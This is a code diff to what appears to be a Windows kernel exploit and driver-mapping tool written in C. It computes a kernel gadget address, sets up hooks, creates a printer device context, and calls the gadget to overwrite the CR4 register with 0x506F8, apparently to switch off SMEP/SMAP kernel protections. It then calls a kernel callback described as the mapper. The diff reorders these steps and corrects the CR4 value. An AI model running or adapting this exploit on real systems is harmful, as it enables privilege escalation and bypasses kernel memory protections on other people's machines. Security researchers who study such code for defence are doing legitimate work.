@@ -295,23 +295,8 @@ int main(int argc, char* argv[])
     DWORD64 gadgetKernelAddress = (DWORD64)kernelBase + gadget - (DWORD64)kernelHandle;
     ConsoleSuccess("Gadget: 0x%p", gadgetKernelAddress);
 
-    BOOL status = SetupHooks();
-    if (!status)
-    {
-        ConsoleError("Failed to setup hooks!");
-        return -1;
-    }
-
-    ConsoleInfo("Creating device context...");
-    dummy = CreateDCA(NULL, printerName, NULL, NULL);
-    if (!dummy)
-    {
-        ConsoleError("Failed to create device context!");
-        return -1;
-    }
-
     ConsoleInfo("Setting thread priority...");
-    status = SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
+    BOOL status = SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
     if (!status)
     {
         ConsoleError("Failed to set thread priority!");
@@ -330,10 +315,24 @@ int main(int argc, char* argv[])
 
     ConsoleSuccess("Thread affinity set");
 
-    ConsoleInfo("Zeroing out cr4...");
-    CallKernelFunction((PVOID)gadgetKernelAddress, 0);
+    status = SetupHooks();
+    if (!status)
+    {
+        ConsoleError("Failed to setup hooks!");
+        return -1;
+    }
 
-    getchar();
+    ConsoleInfo("Creating device context...");
+    dummy = CreateDCA(NULL, printerName, NULL, NULL);
+    if (!dummy)
+    {
+        ConsoleError("Failed to create device context!");
+        return -1;
+    }
+
+    ConsoleInfo("Zeroing out cr4...");
+    CallKernelFunction((PVOID)gadgetKernelAddress, 0x00000000000506F8);
+
     ConsoleInfo("Calling mapper itself...");
     CallKernelFunction((PVOID)KernelCallback, 0);
 }
